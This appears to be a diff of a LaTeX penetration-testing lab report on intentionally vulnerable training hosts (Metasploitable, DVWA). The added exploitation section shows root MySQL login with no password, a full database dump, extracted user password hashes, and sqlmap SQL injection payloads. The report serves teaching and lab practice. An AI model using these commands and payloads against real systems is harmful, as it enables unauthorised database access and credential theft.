@@ -9,16 +9,17 @@
 \usepackage{siunitx}
 \usepackage{tikz}
 \usepackage{csvsimple}
+\usepackage{draftwatermark}
+
+\SetWatermarkText{\textsc{Confidential}}
 
 \lstset{
-  language=Perl,
-  basicstyle=\small\sffamily,
   numbers=left,
   numberstyle=\tiny,
   frame=tb,
-  tabsize=4,
+  tabsize=2,
   columns=fixed,
-  showstringspaces=false,
+  showstringspaces=true,
   showtabs=false,
   keepspaces,
   commentstyle=\color{red},
@@ -187,7 +188,7 @@ that the web applications serve data from.
 
 \noindent The following command was used against each host:
 \begin{lstlisting}[language=bash, firstline=1, lastline=3]
-$ nmap -sV <hostname>
+\$ nmap -sV <hostname>
 
 Starting Nmap 7.01 ( https://nmap.org ) at 2016-02-08 12:02 MST
 Nmap scan report for localhost (127.0.0.1)
@@ -200,7 +201,6 @@ PORT     STATE SERVICE    VERSION
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds
-
 \end{lstlisting}
 
 \subsubsection{metasploitable.sait230.ca}
@@ -209,20 +209,21 @@ I chose to spider the metasploitable website to analyze the full site locally
 to try to identify and information leakage in the website.
 
 \begin{lstlisting}[language=bash, firstline=1, lastline=1]
-$ wget -r metasploitable.sait230.ca
-\end
+\$ wget -r metasploitable.sait230.ca
+\end{lstlisting}
 
 The above command will recursively download the full metasploitable website. I ran grep
 on the downloaded source to try to find some keywords like password.
 
-\begin{lstlisting}[language=bash, firstline=1, lastline=1]
-$ grep -rn password metasploitable.sait230.ca/
-\end
+\begin{lstlisting}[language=bash]
+\$ grep -rn password metasploitable.sait230.ca/
+\end{lstlisting}
 
 Here's one snippet that i discovered:
 
 \begin{lstlisting}[language=bash]
-metasploitable.sait230.ca/mutillidae/index.php?do=toggle-security&page=user-info.php:2:                 <!-- I think the database password is set to blank or perhaps samurai.
+metasploitable.sait230.ca/mutillidae/index.php?do=toggle-security&page=user-info.php:2: \
+<!-- I think the database password is set to blank or perhaps samurai.
 \end{lstlisting}
 
 The above text shows then a client side html comment was left in the code that hints at a possible password for the database.
@@ -230,7 +231,8 @@ The above text shows then a client side html comment was left in the code that h
 Another example:
 
 \begin{lstlisting}[language=Bash]
-metasploitable.sait230.ca/mutillidae/index.php?page=site-footer-xss-discussion.php:5: It is ok to put the password in HTML comments because no user will ever see 
+metasploitable.sait230.ca/mutillidae/index.php?page=site-footer-xss-discussion.php:5: \
+It is ok to put the password in HTML comments because no user will ever see 
 \end{lstlisting}
 
 The above statement is incorrect. Serverside comments will be rendered on the server
@@ -280,7 +282,7 @@ nikto scan:
 + OSVDB-3268: /images/: Directory indexing found.
 + OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
 + OSVDB-3233: /icons/README: Apache default file found.
-+ OSVDB-40478: /tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?: TikiWiki contains a vulnerability which allows remote attackers to execute arbitrary PHP code.
++ OSVDB-40478: /tikiwiki/tiki-graph\_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?: TikiWiki contains a vulnerability which allows remote attackers to execute arbitrary PHP code.
 + /wordpress/: A Wordpress installation was found.
 + /phpmyadmin/: phpMyAdmin directory found
 + 6474 items checked: 2 error(s) and 23 item(s) reported on remote host
@@ -302,7 +304,7 @@ nikto scan:
 + OSVDB-3092: /phpMyAdmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
 + OSVDB-3092: /phpMyAdmin/: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
 + OSVDB-3268: /test/: Directory indexing found.
-+ OSVDB-3092: /test/: This might be interesting...
++ OSVDB-3092: /test/: This might be interesting
 + OSVDB-3268: /icons/: Directory indexing found.
 + OSVDB-3233: /icons/README: Apache default file found.
 + /phpMyAdmin/: phpMyAdmin directory found
@@ -335,7 +337,7 @@ nikto scan:
 + OSVDB-3268: /images/: Directory indexing found.
 + OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
 + OSVDB-3233: /icons/README: Apache default file found.
-+ OSVDB-40478: /tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?: TikiWiki contains a vulnerability which allows remote attackers to execute arbitrary PHP code.
++ OSVDB-40478: /tikiwiki/tiki-graph\_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?: TikiWiki contains a vulnerability which allows remote attackers to execute arbitrary PHP code.
 + /wordpress/: A Wordpress installation was found.
 + /phpmyadmin/: phpMyAdmin directory found
 + 6474 items checked: 3 error(s) and 23 item(s) reported on remote host
@@ -354,8 +356,175 @@ nikto scan:
 \newpage
 \section{Exploitation}
 \subsection{Exploits for metasploitable.sait230.ca}
+
+I noticed that port 3306 was open on this host from the reconasance phase. This port
+is used by mysql. I decided to try to connect to this port using the mysql client and 
+using the default mysql installation user `root'.
+
+\begin{lstlisting}
+root@bt-was:~# mysql -uroot -h metasploitable.sait230.ca
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 36239
+Server version: 5.0.51a-3ubuntu5 (Ubuntu)
+
+Copyright (c) 2000, 2011, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information\_schema |
+| dvwa               |
+| metasploit         |
+| mysql              |
+| owasp10            |
+| tikiwiki           |
+| tikiwiki195        |
++--------------------+
+7 rows in set (0.00 sec)
+
+mysql> 
+
+\end{lstlisting}
+
+To my surprise I was able to connect to the mysql server as the root mysql
+account. This gave me access to all databases on the database server.
+
+Next, I used mysqldump to get a dump of all the databases on this host for offline analysis.
+
+\begin{lstlisting}
+root@bt-was:~# mysqldump -uroot -h metasploitable.sait230.ca --all-databases > all-databases.sql
+\end{lstlisting}
+
+With full root access and a mysql shell I can now insert rows into any table in any database. 
+I can update any record I like and I can read all information in all tables.
+
+\begin{lstlisting}[language=SQL]
+mysql> use dvwa
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++----------------+
+| Tables_in_dvwa |
++----------------+
+| guestbook      |
+| users          |
++----------------+
+2 rows in set (0.00 sec)
+
+mysql> desc users;
++------------+-------------+------+-----+---------+-------+
+| Field      | Type        | Null | Key | Default | Extra |
++------------+-------------+------+-----+---------+-------+
+| user_id    | int(6)      | NO   | PRI | 0       |       |
+| first_name | varchar(15) | YES  |     | NULL    |       |
+| last_name  | varchar(15) | YES  |     | NULL    |       |
+| user       | varchar(15) | YES  |     | NULL    |       |
+| password   | varchar(32) | YES  |     | NULL    |       |
+| avatar     | varchar(70) | YES  |     | NULL    |       |
++------------+-------------+------+-----+---------+-------+
+6 rows in set (0.00 sec)
+
+mysql> select user, password from users;
++---------+----------------------------------+
+| user    | password                         |
++---------+----------------------------------+
+| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 |
+| gordonb | e99a18c428cb38d5f260853678922e03 |
+| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b |
+| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 |
+| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 |
+| NULL    | NULL                             |
++---------+----------------------------------+
+6 rows in set (0.01 sec)
+\end{lstlisting}
+
 \subsection{Exploits for tomcat-apache.sait230.ca}
 \subsection{Exploits for bwa.sait230.ca}
+
+I identified and exploited a sql injection vulnerability in a web application called DVWA\@.
+After logging in to the DVWA application. I changed the security level of the application to low
+and found a page called "SQL Injection".
+
+This page contained a single text box used for searching for a specific user by their id.
+When you enter a user id and click on submit, this page would send a GET request to 
+
+\begin{lstlisting}
+GET http://metasploitable.sait230.ca/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#
+\end{lstlisting}
+
+I grabbed my session cookie value by opening the Web Console in my browser. 
+Then I used javascript to get the document.cookie. The cookie that this server
+returns does not mark the cookie as HTTPOnly, making it accessible via javascript.
+
+\begin{figure}[h!]
+	\includegraphics[width=\linewidth]{images/dvwa-sql-injection.png}
+	\caption{SQL injection page.}
+	\label{fig:sql-injection}
+\end{figure}
+
+With a value URL and Session cookie I can now use SQLMap to test out sql injection attacks.
+I was able to get a dump of the database exported as csv files.
+
+\begin{lstlisting}[language=Bash]
+\./sqlmap.py -u "http://metasploitable.sait230.ca/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=40ae620791b3658e5ee7eaaefbef49dc;" --tables
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 4543=4543 AND 'qoRs'='qoRs&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1' AND (SELECT 1602 FROM(SELECT COUNT(*),CONCAT(0x3a716a663a,(SELECT (CASE WHEN (1602=1602) THEN 1 ELSE 0 END)),0x3a6664633a,FLOOR(RAND(0)*2))x FROM INFORMATION_
+SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'lZPr'='lZPr&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' LIMIT 1,1 UNION ALL SELECT CONCAT(0x3a716a663a,0x4b574169554a4c62647a,0x3a6664633a), NULL#&Submit=Submit
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1' AND SLEEP(5) AND 'QNHQ'='QNHQ&Submit=Submit
+---
+\end{lstlisting}
+
+Here's a listing of the files:
+
+\begin{lstlisting}[language=Bash]
+root@bt-was:/pentest/database/sqlmap# tree -L 1 output/metasploitable.sait230.ca/dump/ | less
+output/metasploitable.sait230.ca/dump/
+├── dvwa
+├── information\_schema
+├── mysql
+├── owasp10
+├── tikiwiki
+└── tikiwiki195
+
+6 directories, 0 files
+
+├── guestbook.csv
+└── users.csv
+
+0 directories, 2 files
+
+\end{lstlisting}
+
+It looks like the dvwa web application running on bwa.sait230.ca was connecting to an
+instance of mysql running from metasploitable.sait230.ca. Using this sql injection vulnerability
+I was able to dump the dvwa database as well as all the other databases
+running from metasploitable.sait230.ca database server.
+
 \subsection{Exploits for ultimatelamp.sait230.ca}
 
 \newpage
